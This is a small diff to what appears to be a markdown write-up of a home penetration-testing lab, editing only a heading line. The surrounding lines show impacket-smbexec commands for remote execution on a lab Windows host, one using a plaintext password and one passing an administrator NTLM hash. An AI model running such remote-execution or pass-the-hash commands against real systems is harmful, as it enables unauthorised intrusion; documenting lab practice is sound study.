@@ -155,7 +155,7 @@ attempted to use wmiexec instead, with no success. However after some trial and 
             impacket-smbexec MARVEL/fcastle:Password1@192.168.64.139  
 ![image](https://github.com/user-attachments/assets/3852e0ef-d03a-4df7-a508-aed4d5e33ff3)
 
-👍4Using smbexec with administrator and hash
+👍Using smbexec with administrator and hash
 
             /home/kali# impacket-smbexec administrator@192.168.64.139 -hashes aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc
 ![image](https://github.com/user-attachments/assets/6d13d42c-9e78-472c-8164-52fe8f118a14)
